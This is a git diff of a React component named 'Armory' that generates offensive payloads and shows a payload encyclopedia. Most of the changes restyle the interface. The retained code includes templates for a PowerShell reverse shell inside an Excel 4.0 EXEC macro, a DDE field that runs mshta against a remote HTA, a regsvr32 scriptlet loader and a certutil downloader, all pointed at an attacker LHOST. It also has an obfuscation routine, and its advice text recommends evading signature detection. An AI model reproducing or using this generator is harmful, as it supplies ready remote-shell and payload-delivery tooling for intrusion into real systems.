@@ -10,8 +10,7 @@ import {
   Terminal, Network, GitMerge, Database,
   Hash, Activity, ShieldAlert,
   Key, Plus, Clock,
-  Hammer,
-} from 'lucide-react'
+  Hammer} from 'lucide-react'
 
 // ─── Types ────────────────────────────────────────────────
 type PayloadType =
@@ -194,7 +193,6 @@ function obfuscatePython(code: string, level: ObfuscationLevel): string {
   }
 
   if (level === 'heavy') {
-    // Variable-name randomized, split into chunks with XOR
     const chunkSize = 32
     const chunks: string[] = []
     for (let i = 0; i < code.length; i += chunkSize) {
@@ -304,7 +302,7 @@ function renderReferences(references: string[]) {
         href={ref} 
         target="_blank" 
         rel="noopener noreferrer"
-        className="text-ghost-cyan hover:underline break-all"
+        className="text-cyan-400 hover:underline break-all"
       >
         {ref}
       </a>
@@ -2104,7 +2102,8 @@ if __name__ == "__main__":
 </registration>
 </scriptlet>
 # Run with: regsvr32 /s /u /i:http://${lhost}:${lport}/payload.sct scrobj.dll`
-      break    }
+      break
+    }
     case 'certutil_downloader': {
       rawCode = base + `# Certutil Downloader (Batch)
 certutil -urlcache -f http://${lhost}:${lport}/payload.b64 payload.b64
@@ -2113,9 +2112,7 @@ payload.exe`
       break
     }
     case 'excel4_macro': {
-      // FIXED: Double all $ characters so Excel treats them as literals
       const psCommand = `powershell -WindowStyle Hidden -Command $client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport}); $stream = $client.GetStream(); [byte[]]$b = 0..65535 | %{0}; while(($i = $stream.Read($b, 0, $b.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }`
-      // Excel 4.0 formulas interpret $ as a literal dollar sign ONLY when doubled
       const excelSafe = psCommand.replace(/\$/g, '$$$$')
       rawCode = base + `# Excel 4.0 Macro (XLM)
 =EXEC("${excelSafe}")
@@ -2123,7 +2120,6 @@ payload.exe`
       break
     }
     case 'dde_injection': {
-      // FIXED: Use mshta with remote payload to avoid nested quoting issues
       rawCode = base + `# DDE Injection Field
 { DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k mshta.exe http://${lhost}:${lport}/payload.hta" }
 # Or simpler: { DDEAUTO "c:\\\\windows\\\\system32\\\\mshta.exe" "http://${lhost}:${lport}/payload.hta" }
@@ -2213,7 +2209,7 @@ export default function PayloadForge() {
   const [copyStatus, setCopyStatus] = useState<'idle' | 'success' | 'error' | 'manual'>('idle')
   const [lhostError, setLhostError] = useState<string | null>(null)
   const [lportError, setLportError] = useState<string | null>(null)
-  const [showPayloadInfo, setShowPayloadInfo] = useState(true) // New state for payload info section
+  const [showPayloadInfo, setShowPayloadInfo] = useState(true)
   
   const currentPayloadInfo = PAYLOAD_BY_TYPE[selectedPayload]
   
@@ -2349,14 +2345,12 @@ export default function PayloadForge() {
       return
     }
     
-    // localhost
     if (trimmed === 'localhost') {
       setLhost(trimmed)
       setLhostError(null)
       return
     }
     
-    // IPv4 with octet validation
     const ipv4Match = trimmed.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/)
     if (ipv4Match) {
       const octets = [ipv4Match[1], ipv4Match[2], ipv4Match[3], ipv4Match[4]].map(Number)
@@ -2369,14 +2363,12 @@ export default function PayloadForge() {
       return
     }
     
-    // IPv6 (basic — contains colon, no spaces, hex chars)
     if (trimmed.includes(':') && !/\s/.test(trimmed) && /^[0-9a-fA-F:]+$/.test(trimmed)) {
       setLhost(trimmed)
       setLhostError(null)
       return
     }
     
-    // Hostname (RFC 1123 + allow underscores for internal use)
     if (/^[a-zA-Z0-9]([a-zA-Z0-9_-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9_-]{0,61}[a-zA-Z0-9])?)*$/.test(trimmed)) {
       setLhost(trimmed)
       setLhostError(null)
@@ -2397,7 +2389,6 @@ export default function PayloadForge() {
       setCopyStatus('success')
       copyTimerRef.current = setTimeout(() => setCopyStatus('idle'), 2000)
     } catch (e) {
-      // Try legacy fallback
       const textarea = document.createElement('textarea')
       textarea.value = text
       textarea.style.position = 'fixed'
@@ -2457,7 +2448,6 @@ export default function PayloadForge() {
     sel?.addRange(range)
   }
 
-  // Auto-select on manual copy modal
   useEffect(() => {
     if (copyStatus === 'manual' && manualCopyRef.current) {
       handleSelectAll()
@@ -2472,7 +2462,6 @@ export default function PayloadForge() {
         next.delete(type)
       } else {
         next.add(type)
-        // Cap at 10 to prevent memory issues
         if (next.size > 10) {
           const first = next.values().next().value
           if (first !== undefined) {
@@ -2493,33 +2482,528 @@ export default function PayloadForge() {
     return groups
   }, [])
 
-  const inputClass = "w-full bg-ghost-bg border border-ghost-border rounded-xl px-4 py-2.5 text-sm font-mono"
-  const selectClass = "w-full bg-ghost-bg border border-ghost-border rounded-xl px-4 py-2.5 text-sm"
+  const inputClass = "w-full bg-black/30 border border-white/10 rounded-xl px-4 py-2.5 text-sm font-mono text-white/80 focus:outline-none focus:border-red-500/30 placeholder-white/20"
+  const selectClass = "w-full bg-black/30 border border-white/10 rounded-xl px-4 py-2.5 text-sm text-white/80 focus:outline-none focus:border-red-500/30"
 
   return (
-    <div className="max-w-7xl mx-auto p-6">
+    <div className="min-h-full overflow-y-auto" style={{ background: 'linear-gradient(135deg, #090b14 0%, #0d1022 50%, #090b14 100%)' }}>
+      
+      {/* ── Header ── */}
+      <div className="flex items-center justify-between px-8 py-4 border-b border-white/5 flex-wrap gap-2">
+        <div className="flex items-center gap-3">
+          <div className="w-9 h-9 rounded-xl flex items-center justify-center border border-red-500/20" style={{ background: 'radial-gradient(circle, rgba(239,68,68,0.18), rgba(239,68,68,0.04))' }}>
+            <Swords size={16} className="text-red-400" />
+          </div>
+          <div>
+            <span className="text-white font-bold text-base">Armory</span>
+            <div className="text-white/40 text-xs">Generate + Understand Red Team Payloads</div>
+          </div>
+        </div>
+        <div className="flex gap-2">
+          <div className="flex bg-white/5 border border-white/10 rounded-xl p-0.5">
+            <button
+              onClick={() => setActiveTab('encyclopedia')}
+              className={`px-4 py-1.5 rounded-lg flex items-center gap-1.5 text-xs font-medium transition-all ${
+                activeTab === 'encyclopedia' 
+                  ? 'bg-red-500/20 text-red-400 border border-red-500/30' 
+                  : 'text-white/40 hover:text-white/80'
+              }`}
+            >
+              <BookOpen size={12} /> Encyclopedia ({PAYLOAD_ENCYCLOPEDIA.length})
+            </button>
+            <button
+              onClick={() => setActiveTab('generator')}
+              className={`px-4 py-1.5 rounded-lg flex items-center gap-1.5 text-xs font-medium transition-all ${
+                activeTab === 'generator' 
+                  ? 'bg-red-500/20 text-red-400 border border-red-500/30' 
+                  : 'text-white/40 hover:text-white/80'
+              }`}
+            >
+              <Zap size={12} /> Generator
+            </button>
+          </div>
+        </div>
+      </div>
+
+      {/* ── Main Content ── */}
+      <div className="px-8 py-6 max-w-7xl mx-auto">
+
+        {/* PAYLOAD INFO SECTION - Collapsible */}
+        <div className="mb-6">
+          <button
+            onClick={() => setShowPayloadInfo(!showPayloadInfo)}
+            className="w-full flex items-center justify-between bg-red-500/5 border border-red-500/20 rounded-2xl px-6 py-4 hover:bg-red-500/10 transition-all group"
+          >
+            <div className="flex items-center gap-3">
+              <div className="p-2 rounded-xl bg-red-500/20 text-red-400 group-hover:scale-110 transition-transform">
+                <Swords size={18} />
+              </div>
+              <div className="text-left">
+                <span className="text-red-400 font-bold text-sm">What is a Payload?</span>
+                <span className="text-white/30 text-xs ml-3 hidden sm:inline">
+                  {showPayloadInfo ? 'Click to collapse' : 'Click to expand'} — Essential knowledge for every hacker
+                </span>
+              </div>
+            </div>
+            <div className="text-white/30 group-hover:text-red-400 transition-colors">
+              {showPayloadInfo ? <ChevronUp size={20} /> : <ChevronDown size={20} />}
+            </div>
+          </button>
+          
+          {showPayloadInfo && (
+            <div className="bg-white/5 border border-red-500/20 border-t-0 rounded-b-2xl p-6 space-y-4 text-xs text-white/70 leading-relaxed">
+              <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                <div className="space-y-3">
+                  <div className="flex items-center gap-2">
+                    <div className="w-1 h-8 bg-red-500 rounded-full"></div>
+                    <h3 className="text-red-400 font-bold text-sm">What is a Payload?</h3>
+                  </div>
+                  <p className="text-white/50 pl-3">
+                    In cybersecurity, a <span className="text-red-400 font-semibold">payload</span> is the component of a malicious 
+                    program or exploit that performs the actual harmful action. It's the "cargo" delivered by an exploit's delivery 
+                    mechanism (the "vector").
+                  </p>
+                  <div className="bg-black/30 border border-white/5 rounded-xl p-3 mt-2">
+                    <code className="text-xs text-cyan-400">
+                      Exploit (Vector) → Delivery → <span className="text-red-400 font-bold">Payload</span> (Action)
+                    </code>
+                  </div>
+                </div>
+
+                <div className="space-y-3">
+                  <div className="flex items-center gap-2">
+                    <div className="w-1 h-8 bg-cyan-400 rounded-full"></div>
+                    <h3 className="text-cyan-400 font-bold text-sm">Common Payload Types</h3>
+                  </div>
+                  <ul className="space-y-2 text-white/50 pl-3">
+                    <li className="flex items-start gap-2">
+                      <span className="text-cyan-400 mt-0.5">•</span>
+                      <div><span className="text-white font-medium">Reverse Shell:</span> Target connects back to attacker</div>
+                    </li>
+                    <li className="flex items-start gap-2">
+                      <span className="text-cyan-400 mt-0.5">•</span>
+                      <div><span className="text-white font-medium">Bind Shell:</span> Target listens for incoming connection</div>
+                    </li>
+                    <li className="flex items-start gap-2">
+                      <span className="text-cyan-400 mt-0.5">•</span>
+                      <div><span className="text-white font-medium">WebShell:</span> Web-based command execution interface</div>
+                    </li>
+                    <li className="flex items-start gap-2">
+                      <span className="text-cyan-400 mt-0.5">•</span>
+                      <div><span className="text-white font-medium">Meterpreter:</span> Advanced post-exploitation framework</div>
+                    </li>
+                    <li className="flex items-start gap-2">
+                      <span className="text-cyan-400 mt-0.5">•</span>
+                      <div><span className="text-white font-medium">Shellcode:</span> Raw machine code for memory injection</div>
+                    </li>
+                  </ul>
+                </div>
+
+                <div className="space-y-3">
+                  <div className="flex items-center gap-2">
+                    <div className="w-1 h-8 bg-emerald-400 rounded-full"></div>
+                    <h3 className="text-emerald-400 font-bold text-sm">Best Practices</h3>
+                  </div>
+                  <ul className="space-y-2 text-white/50 pl-3">
+                    <li className="flex items-start gap-2">
+                      <span className="text-emerald-400 mt-0.5">✓</span>
+                      <div>Always <span className="text-white font-medium">test</span> payloads in isolated lab environments first</div>
+                    </li>
+                    <li className="flex items-start gap-2">
+                      <span className="text-emerald-400 mt-0.5">✓</span>
+                      <div>Use <span className="text-white font-medium">obfuscation</span> to bypass signature-based detection</div>
+                    </li>
+                    <li className="flex items-start gap-2">
+                      <span className="text-emerald-400 mt-0.5">✓</span>
+                      <div><span className="text-white font-medium">Verify</span> payloads are functional before deployment</div>
+                    </li>
+                    <li className="flex items-start gap-2">
+                      <span className="text-emerald-400 mt-0.5">✓</span>
+                      <div>Always have a <span className="text-white font-medium">fallback</span> listener ready</div>
+                    </li>
+                    <li className="flex items-start gap-2">
+                      <span className="text-emerald-400 mt-0.5">✓</span>
+                      <div>Stay <span className="text-white font-medium">legal</span> — only test on systems you own or have permission</div>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+
+              <div className="border-t border-white/5 pt-4 mt-2">
+                <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs">
+                  <div className="bg-black/30 border border-white/5 rounded-xl p-3">
+                    <div className="text-amber-400 font-bold mb-1">🎯 Staged vs Stageless</div>
+                    <p className="text-white/50">
+                      <span className="text-white">Staged:</span> Small initial payload downloads the full payload later. 
+                      <span className="text-white ml-2">Stageless:</span> Everything is included in one file.
+                    </p>
+                  </div>
+                  <div className="bg-black/30 border border-white/5 rounded-xl p-3">
+                    <div className="text-amber-400 font-bold mb-1">🔒 Encryption Matters</div>
+                    <p className="text-white/50">
+                      Encrypted payloads (HTTPS, AES) evade network detection but require more complex listeners. 
+                      <span className="text-white ml-2">Trade-off: Stealth vs Complexity.</span>
+                    </p>
+                  </div>
+                  <div className="bg-black/30 border border-white/5 rounded-xl p-3">
+                    <div className="text-amber-400 font-bold mb-1">📊 Detection Reality</div>
+                    <p className="text-white/50">
+                      Most payloads are <span className="text-white">detectable</span> by modern EDR. The goal is 
+                      <span className="text-white ml-1">delaying detection</span> long enough to achieve objectives.
+                    </p>
+                  </div>
+                </div>
+              </div>
+
+              <div className="text-[10px] text-white/30 text-center border-t border-white/5 pt-3">
+                <span className="text-red-400">⚠️</span> This information is for <span className="text-white font-medium">educational and authorized testing</span> purposes only. 
+                Unauthorized use of payloads is illegal.
+              </div>
+            </div>
+          )}
+        </div>
+
+        {/* ── ENCYCLOPEDIA TAB ── */}
+        {activeTab === 'encyclopedia' && (
+          <div>
+            <div className="mb-6">
+              <h2 className="text-xl font-semibold text-white mb-1">Payload Encyclopedia</h2>
+              <p className="text-white/40 text-sm">Learn what each payload does, when to use it, and how it works. Click on a card to expand for deep dive details.</p>
+            </div>
+
+            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
+              {PAYLOAD_ENCYCLOPEDIA.map((payload) => {
+                const isExpanded = expandedPayloads.has(payload.type)
+                return (
+                  <div
+                    key={payload.type}
+                    className={`bg-white/5 border rounded-2xl p-5 transition-all cursor-pointer ${
+                      isExpanded ? 'border-red-500/30 bg-red-500/5' : 'border-white/5 hover:border-red-500/20'
+                    }`}
+                    onClick={() => toggleExpand(payload.type)}
+                  >
+                    <div className="flex items-start justify-between mb-3">
+                      <div className={`${payload.color} group-hover:scale-110 transition-transform`}>
+                        {payload.icon}
+                      </div>
+                      <div className="flex items-center gap-2" onClick={e => e.stopPropagation()}>
+                        <div className="text-[10px] px-2 py-0.5 rounded-full bg-white/5 border border-white/10 text-white/40">
+                          {payload.supportedFormats.length} formats
+                        </div>
+                        {isExpanded ? <ChevronUp size={16} className="text-white/30" /> : <ChevronDown size={16} className="text-white/30" />}
+                      </div>
+                    </div>
+
+                    <h3 className="text-base font-bold text-white mb-1">{payload.name}</h3>
+                    <p className="text-white/50 text-xs mb-3">{payload.description}</p>
+
+                    <div className="space-y-2 text-xs">
+                      <div>
+                        <div className="text-red-400 text-[10px] font-mono mb-0.5">WHAT IT DOES</div>
+                        <p className="text-white/50">{payload.whatItDoes}</p>
+                      </div>
+                      <div>
+                        <div className="text-red-400 text-[10px] font-mono mb-0.5">WHERE TO USE</div>
+                        <p className="text-white/50">{payload.whereToUse}</p>
+                      </div>
+                    </div>
+
+                    {isExpanded && (
+                      <div className="mt-4 pt-4 border-t border-white/5 space-y-3 animate-in slide-in-from-top-4 duration-200">
+                        <div>
+                          <div className="text-cyan-400 text-[10px] font-mono mb-0.5 flex items-center gap-1"><Lightbulb size={12} /> HOW IT WORKS</div>
+                          <p className="text-xs text-white/50 leading-relaxed">{payload.howItWorks}</p>
+                        </div>
+                        <div>
+                          <div className="text-amber-400 text-[10px] font-mono mb-0.5">EXAMPLE SCENARIO</div>
+                          <p className="text-xs text-white/50">{payload.exampleScenario}</p>
+                        </div>
+                        <div>
+                          <div className="text-emerald-400 text-[10px] font-mono mb-0.5">LISTENER COMMAND</div>
+                          <code className="text-[10px] bg-black/30 px-2 py-1.5 rounded block font-mono text-emerald-400 break-all">
+                            {payload.commonListenerCommand}
+                          </code>
+                        </div>
+                        <div className="grid grid-cols-2 gap-3">
+                          <div>
+                            <div className="text-red-400 text-[10px] font-mono mb-0.5 flex items-center gap-1"><AlertCircle size={12} /> DETECTION INDICATORS</div>
+                            <ul className="text-[10px] text-white/50 list-disc list-inside space-y-0.5">
+                              {payload.detectionIndicators.map((item, i) => <li key={i}>{item}</li>)}
+                            </ul>
+                          </div>
+                          <div>
+                            <div className="text-blue-400 text-[10px] font-mono mb-0.5 flex items-center gap-1"><CheckCircle size={12} /> MITIGATION TIPS</div>
+                            <ul className="text-[10px] text-white/50 list-disc list-inside space-y-0.5">
+                              {payload.mitigationTips.map((item, i) => <li key={i}>{item}</li>)}
+                            </ul>
+                          </div>
+                        </div>
+                        <div>
+                          <div className="text-white/30 text-[10px] font-mono mb-0.5">REFERENCES</div>
+                          <ul className="text-[10px] text-white/50 list-disc list-inside">
+                            {renderReferences(payload.references)}
+                          </ul>
+                        </div>
+                        {!payload.isComplete && (
+                          <div className="text-[10px] text-amber-400 flex items-center gap-1">
+                            <AlertCircle size={12} /> Template only — may need completion for production use
+                          </div>
+                        )}
+                        <button
+                          onClick={(e) => {
+                            e.stopPropagation()
+                            handlePayloadChange(payload.type)
+                            setActiveTab('generator')
+                          }}
+                          className="text-[10px] flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-red-500/10 hover:bg-red-500/20 text-red-400 transition-colors border border-red-500/20"
+                        >
+                          <Play size={12} /> Generate this payload
+                        </button>
+                      </div>
+                    )}
+
+                    <div className="mt-3 pt-3 border-t border-white/5 flex justify-between items-center">
+                      <span className="text-[10px] text-white/30">{isExpanded ? 'Click to collapse' : 'Click for deep dive'}</span>
+                      <span className="text-[10px] text-white/30 flex items-center gap-1">
+                        {payload.pros.length} pros · {payload.cons.length} cons
+                      </span>
+                    </div>
+                  </div>
+                )
+              })}
+            </div>
+          </div>
+        )}
+
+        {/* ── GENERATOR TAB ── */}
+        {activeTab === 'generator' && currentPayloadInfo && (
+          <div className="grid grid-cols-1 xl:grid-cols-12 gap-6">
+            <div className="xl:col-span-5 space-y-4">
+              <div className="bg-white/5 border border-white/5 rounded-2xl p-5">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-sm font-semibold text-white flex items-center gap-2">
+                    <Target size={16} className="text-red-400" /> Payload Configuration
+                  </h3>
+                  <button
+                    onClick={() => {
+                      setLhost('10.10.14.5')
+                      setLport(currentPayloadInfo.defaultPort)
+                      setFormat(currentPayloadInfo.supportedFormats[0])
+                      setObfuscation('none')
+                      setGeneratedPayload('')
+                      setShowRaw(false)
+                      setLhostError(null)
+                      setLportError(null)
+                    }}
+                    className="text-[10px] text-white/40 hover:text-white/80 transition-colors"
+                  >
+                    Reset
+                  </button>
+                </div>
+
+                <div className="mb-4">
+                  <label className="text-[10px] text-white/40 block mb-1.5">Payload Type</label>
+                  <select
+                    value={selectedPayload}
+                    onChange={(e) => handlePayloadChange(e.target.value as PayloadType)}
+                    className={selectClass}
+                  >
+                    {Object.entries(payloadCategories).map(([category, payloads]) => (
+                      <optgroup key={category} label={category}>
+                        {payloads.map(p => (
+                          <option key={p.type} value={p.type} style={{ background: '#0d1022' }}>{p.name}</option>
+                        ))}
+                      </optgroup>
+                    ))}
+                  </select>
+                </div>
+
+                <div className="mb-4 p-3 bg-black/30 border border-white/5 rounded-xl">
+                  <div className="flex items-center gap-2 mb-2">
+                    <div className={currentPayloadInfo.color}>{currentPayloadInfo.icon}</div>
+                    <div>
+                      <div className="text-sm font-semibold text-white">{currentPayloadInfo.name}</div>
+                      <div className="text-[10px] text-white/40">{currentPayloadInfo.description}</div>
+                    </div>
+                  </div>
+                  <div className="text-[10px] text-white/40 space-y-0.5">
+                    <div><strong className="text-red-400">Where to use:</strong> {currentPayloadInfo.whereToUse}</div>
+                    <div><strong className="text-red-400">How it works:</strong> <span className="italic">{currentPayloadInfo.howItWorks.slice(0, 100)}...</span></div>
+                    <div><strong className="text-red-400">Listener:</strong> <code className="text-cyan-400 bg-black/30 px-1 py-0.5 rounded">{substituteListener(currentPayloadInfo.commonListenerCommand, lhost, lport)}</code></div>
+                  </div>
+                  {!currentPayloadInfo.isComplete && (
+                    <div className="mt-1 text-[10px] text-amber-400 flex items-center gap-1">
+                      <AlertCircle size={10} /> Template only — may need completion for production use
+                    </div>
+                  )}
+                </div>
+
+                <div className="grid grid-cols-2 gap-3 mb-4">
+                  <div>
+                    <label className="text-[10px] text-white/40 block mb-1">LHOST</label>
+                    <input
+                      type="text"
+                      value={lhost}
+                      onChange={(e) => handleLhostChange(e.target.value)}
+                      disabled={!currentPayloadInfo.requiresLhost}
+                      placeholder={currentPayloadInfo.requiresLhost ? "10.10.14.5" : "Not required"}
+                      className={`${inputClass} disabled:opacity-40`}
+                    />
+                    {lhostError && <div className="text-[10px] text-red-400 mt-1">{lhostError}</div>}
+                  </div>
+                  <div>
+                    <label className="text-[10px] text-white/40 block mb-1">LPORT</label>
+                    <input
+                      type="number"
+                      min="1"
+                      max="65535"
+                      value={lport}
+                      onChange={(e) => handleLportChange(e.target.value)}
+                      disabled={!currentPayloadInfo.requiresLport}
+                      placeholder={currentPayloadInfo.requiresLport ? "4444" : "Not required"}
+                      className={`${inputClass} disabled:opacity-40`}
+                    />
+                    {lportError && <div className="text-[10px] text-red-400 mt-1">{lportError}</div>}
+                  </div>
+                </div>
+
+                <div className="grid grid-cols-2 gap-3">
+                  <div>
+                    <label className="text-[10px] text-white/40 block mb-1">Output Format</label>
+                    <select
+                      value={format}
+                      onChange={(e) => setFormat(e.target.value as OutputFormat)}
+                      className={selectClass}
+                    >
+                      {currentPayloadInfo.supportedFormats.map(f => (
+                        <option key={f} value={f} style={{ background: '#0d1022' }}>{f}</option>
+                      ))}
+                    </select>
+                  </div>
+                  <div>
+                    <label className="text-[10px] text-white/40 block mb-1">Obfuscation</label>
+                    <select
+                      value={obfuscation}
+                      onChange={(e) => setObfuscation(e.target.value as ObfuscationLevel)}
+                      className={selectClass}
+                    >
+                      <option value="none" style={{ background: '#0d1022' }}>None</option>
+                      <option value="light" style={{ background: '#0d1022' }}>Light</option>
+                      <option value="medium" style={{ background: '#0d1022' }}>Medium</option>
+                      <option value="heavy" style={{ background: '#0d1022' }}>Heavy</option>
+                    </select>
+                    {obfuscation !== 'none' && !OBFUSCATION_SUPPORTED_FORMATS.includes(format) && (
+                      <div className="text-[10px] text-amber-400 mt-1 flex items-center gap-1">
+                        <AlertCircle size={10} /> Obfuscation not supported for {format}
+                      </div>
+                    )}
+                  </div>
+                </div>
+              </div>
+
+              <button
+                onClick={generate}
+                className="w-full py-3.5 rounded-xl font-bold text-white text-sm flex items-center justify-center gap-2 transition-all"
+                style={{ background: 'linear-gradient(90deg, #dc2626, #b91c1c)' }}
+              >
+                Generate Payload <Zap size={14} />
+              </button>
+            </div>
+
+            <div className="xl:col-span-7">
+              <div className="bg-white/5 border border-white/5 rounded-2xl p-5 h-full flex flex-col">
+                <div className="flex justify-between items-center mb-3">
+                  <h3 className="text-sm font-semibold text-white flex items-center gap-2">
+                    <Code size={14} className="text-red-400" /> Generated Payload
+                  </h3>
+                  {generatedPayload && (
+                    <div className="flex gap-2 flex-wrap">
+                      <button onClick={() => setShowRaw(!showRaw)} className="text-[10px] px-2 py-1 rounded-xl border border-white/10 text-white/40 hover:text-white/80 transition-colors flex items-center gap-1">
+                        {showRaw ? <EyeOff size={12} /> : <Eye size={12} />} {showRaw ? 'Formatted' : 'Raw'}
+                      </button>
+                      <button onClick={() => copyToClipboard(generatedPayload)} className="text-[10px] px-2 py-1 rounded-xl border border-white/10 text-white/40 hover:text-white/80 transition-colors flex items-center gap-1">
+                        {copyStatus === 'success' ? <><CheckCircle size={12} /> Copied!</> : 
+                         copyStatus === 'error' ? <><AlertCircle size={12} /> Failed</> :
+                         copyStatus === 'manual' ? <><Copy size={12} /> Select</> :
+                         <><Copy size={12} /> Copy</>}
+                      </button>
+                      <button onClick={downloadPayload} className="text-[10px] px-2 py-1 rounded-xl bg-red-500/10 text-red-400 hover:bg-red-500/20 border border-red-500/20 transition-colors flex items-center gap-1">
+                        <Download size={12} /> Download
+                      </button>
+                    </div>
+                  )}
+                </div>
+
+                <div className="flex-1 bg-black/30 rounded-xl p-3 overflow-auto font-mono text-xs border border-white/5 min-h-[280px]">
+                  {generatedPayload ? (
+                    <pre className="whitespace-pre-wrap break-all text-emerald-400">
+                      {showRaw ? generatedPayload : generatedPayload
+                        .split('\n')
+                        .map((line, i) => <div key={i} className="leading-relaxed break-all">{line || '\u00A0'}</div>)}
+                    </pre>
+                  ) : (
+                    <div className="h-full flex items-center justify-center text-center text-white/30">
+                      <div>
+                        <Swords size={40} className="mx-auto mb-3 opacity-30" />
+                        <p className="text-sm">Click "Generate Payload" to create your payload</p>
+                      </div>
+                    </div>
+                  )}
+                </div>
+
+                {generatedPayload && (
+                  <div className="mt-3 p-3 bg-black/30 border border-white/5 rounded-xl text-xs">
+                    <div className="font-semibold text-red-400 mb-1.5 flex items-center gap-1.5">
+                      <Lightbulb size={12} /> Quick Usage Guide
+                    </div>
+                    <p className="text-white/50">{currentPayloadInfo.howToUse}</p>
+                    <div className="mt-1.5 text-[10px] text-white/40">
+                      <span className="text-white">Listener:</span> <code className="bg-black/30 px-1.5 py-0.5 rounded text-emerald-400">{substituteListener(currentPayloadInfo.commonListenerCommand, lhost, lport)}</code>
+                    </div>
+                    <div className="mt-1.5 grid grid-cols-2 gap-2 text-[10px]">
+                      <div className="border border-emerald-500/20 rounded p-1.5 bg-emerald-500/5">
+                        <div className="text-emerald-400 font-mono text-[9px]">PROS</div>
+                        <ul className="list-disc list-inside text-white/40 mt-0.5 space-y-0.5">
+                          {currentPayloadInfo.pros.slice(0, 2).map((p, i) => <li key={i}>{p}</li>)}
+                        </ul>
+                      </div>
+                      <div className="border border-red-500/20 rounded p-1.5 bg-red-500/5">
+                        <div className="text-red-400 font-mono text-[9px]">CONS</div>
+                        <ul className="list-disc list-inside text-white/40 mt-0.5 space-y-0.5">
+                          {currentPayloadInfo.cons.slice(0, 2).map((c, i) => <li key={i}>{c}</li>)}
+                        </ul>
+                      </div>
+                    </div>
+                  </div>
+                )}
+              </div>
+            </div>
+          </div>
+        )}
+      </div>
+
       {/* Manual Copy Modal with Select All */}
       {copyStatus === 'manual' && (
         <div className="fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-4" onClick={() => setCopyStatus('idle')}>
-          <div className="bg-ghost-surface p-6 rounded-2xl max-w-2xl w-full" onClick={e => e.stopPropagation()}>
-            <h3 className="text-lg font-bold mb-3">Manual Copy Required</h3>
-            <p className="text-sm text-ghost-text-dim mb-3">
-              Tap "Select All" below, then press <kbd>Ctrl+C</kbd> (or <kbd>Cmd+C</kbd> on Mac, long-press → Copy on mobile).
+          <div className="bg-[#0d1022] border border-white/10 rounded-2xl p-6 max-w-2xl w-full" onClick={e => e.stopPropagation()}>
+            <h3 className="text-lg font-bold text-white mb-2">Manual Copy Required</h3>
+            <p className="text-sm text-white/40 mb-3">
+              Tap "Select All" below, then press <kbd className="bg-white/10 px-1.5 py-0.5 rounded text-white/60">Ctrl+C</kbd> (or <kbd className="bg-white/10 px-1.5 py-0.5 rounded text-white/60">Cmd+C</kbd> on Mac, long-press → Copy on mobile).
             </p>
             <pre 
               ref={manualCopyRef}
-              className="w-full h-64 bg-ghost-bg border border-ghost-border rounded-xl p-3 font-mono text-xs overflow-auto whitespace-pre-wrap break-all select-text"
+              className="w-full h-64 bg-black/30 border border-white/5 rounded-xl p-3 font-mono text-xs overflow-auto whitespace-pre-wrap break-all select-text text-emerald-400"
             >
               {generatedPayload}
             </pre>
             <div className="flex gap-2 mt-3">
               <button
                 onClick={handleSelectAll}
-                className="flex-1 py-2 bg-red-700/10 text-red-400 rounded-lg text-sm font-medium hover:bg-red-700/20"
+                className="flex-1 py-2 bg-red-500/10 text-red-400 rounded-lg text-sm font-medium hover:bg-red-500/20 border border-red-500/20 transition-colors"
               >
                 Select All
               </button>
-              <button onClick={() => setCopyStatus('idle')} className="px-4 py-2 text-ghost-text-dim text-sm hover:text-white">
+              <button onClick={() => setCopyStatus('idle')} className="px-4 py-2 text-white/40 text-sm hover:text-white transition-colors">
                 Close
               </button>
             </div>
@@ -2527,482 +3011,17 @@ export default function PayloadForge() {
         </div>
       )}
 
-      <div className="flex items-center justify-between mb-8">
-        <div>
-          <h1 className="text-4xl font-bold flex items-center gap-3">
-            <Swords className="text-red-500" /> Armory
-          </h1>
-          <p className="text-ghost-text-dim mt-2">Generate + Understand Red Team Payloads</p>
-        </div>
-        <div className="flex bg-ghost-surface rounded-xl p-1 border border-ghost-border">
-          <button
-            onClick={() => setActiveTab('encyclopedia')}
-            className={`px-5 py-2 rounded-lg flex items-center gap-2 text-sm font-medium transition-all ${activeTab === 'encyclopedia' ? 'bg-red-700 text-white' : 'text-ghost-text-dim hover:text-white'}`}
-          >
-            <BookOpen size={16} /> Encyclopedia ({PAYLOAD_ENCYCLOPEDIA.length})
-          </button>
-          <button
-            onClick={() => setActiveTab('generator')}
-            className={`px-5 py-2 rounded-lg flex items-center gap-2 text-sm font-medium transition-all ${activeTab === 'generator' ? 'bg-red-700 text-white' : 'text-ghost-text-dim hover:text-white'}`}
-          >
-            <Zap size={16} /> Generator
-          </button>
-        </div>
-      </div>
-
-      {/* PAYLOAD INFO SECTION - Collapsible */}
-      <div className="mb-6">
-        <button
-          onClick={() => setShowPayloadInfo(!showPayloadInfo)}
-          className="w-full flex items-center justify-between bg-gradient-to-r from-red-700/10 to-red-900/10 border border-red-600/20 rounded-xl px-6 py-4 hover:from-pink-500/20 hover:to-rose-500/20 transition-all group"
-        >
-          <div className="flex items-center gap-3">
-            <div className="p-2 rounded-lg bg-red-700/20 text-red-400 group-hover:scale-110 transition-transform">
-              <Swords size={20} />
-            </div>
-            <div className="text-left">
-              <span className="text-red-400 font-bold text-lg">What is a Payload?</span>
-              <span className="text-ghost-text-dim text-sm ml-3 hidden sm:inline">
-                {showPayloadInfo ? 'Click to collapse' : 'Click to expand'} — Essential knowledge for every hacker
-              </span>
-            </div>
-          </div>
-          <div className="text-ghost-text-dim group-hover:text-red-400 transition-colors">
-            {showPayloadInfo ? <ChevronUp size={22} /> : <ChevronDown size={22} />}
-          </div>
-        </button>
-        
-        {showPayloadInfo && (
